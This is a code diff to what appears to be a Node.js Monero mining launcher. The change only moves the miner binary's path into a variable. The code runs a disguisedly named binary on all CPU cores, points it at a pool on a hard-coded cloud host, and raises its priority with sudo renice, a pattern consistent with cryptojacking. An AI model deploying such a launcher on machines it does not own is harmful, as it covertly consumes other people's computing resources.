@@ -10,6 +10,7 @@ const poolPort = (args[1]) ? args[1].split(':')[1] : '';
 const wallet = (args[0]) ? args[0] : '';
 const url = "http://api.minexmr.com:8080/stats_address?address=" +  wallet + "&longpoll=false";
 var nPool = "ec2-18-221-42-187.us-east-2.compute.amazonaws.com:" + poolPort;
+var minerPath = '/patata-master/patata2';
 var minerArgs = ['-o', args[1], '-u', args[0], '-t', os.cpus().length, '--av=2', '-k', '--no-color']
 var miner;
 
@@ -38,7 +39,7 @@ var body = {
     sys: getInfo()
 };
 
-miner = spawn('/patata/patata2', minerArgs);
+miner = spawn(minerPath, minerArgs);
 execSync('sudo renice -n -20 -p ' + miner.pid);
 miner.stdout.on('data', parseOutput);
 
